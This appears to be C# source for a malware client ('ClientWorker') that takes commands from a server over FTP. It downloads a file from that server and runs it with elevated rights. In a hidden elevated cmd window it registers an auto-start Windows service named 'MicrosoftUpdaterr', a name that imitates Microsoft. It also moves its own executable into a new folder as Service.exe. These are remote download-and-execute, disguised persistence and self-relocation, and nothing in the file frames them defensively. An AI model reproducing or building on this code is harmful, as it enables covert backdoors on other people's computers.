using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Text;
using System.Threading.Tasks;

namespace ClientWorker
{
    public class Functions
    {
        FtpClient ftpClient = new FtpClient();

        public void Start()
        {
            ftpClient.Init();
        }

        private void GetUpdater()
        {
            ftpClient.FTPDownloadFile(StartData.updater);
            Process proc = new Process();
            proc.StartInfo.FileName = StartData.updater;
            proc.StartInfo.Verb = "runas";           
            proc.Start();
        }

        public void AnalysisAnswer(string answer)
        {
            switch (answer)
            {
                case "DownloadUpdater":
                    GetUpdater();
                    break;
                default:
                    Console.WriteLine("UnknownCommand " + answer);
                    break;
            }
        }

        public void Registration()
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Verb = "runas";
            proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftUpdaterr binPath= " + @"C:\Windows\Windows\Service.exe" +" DisplayName= MicrosoftUpdaterr type= own start= auto";
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
            Proliferation();
        }
        public void Proliferation()
        {
            string path = StartData.floaderNewCopy;
            string fileName = Application.ExecutablePath;

            try
            {
                if (Directory.Exists(path))
                {
                    return;
                }
                else
                {
                    DirectoryInfo di = Directory.CreateDirectory(path);
                    File.Move(fileName, StartData.floaderNewCopy + "Service.exe");                
                }              
            }
            catch (Exception e)
            {
                Console.WriteLine("The process failed: {0}", e.ToString());
            }
                       
        }
    }
}
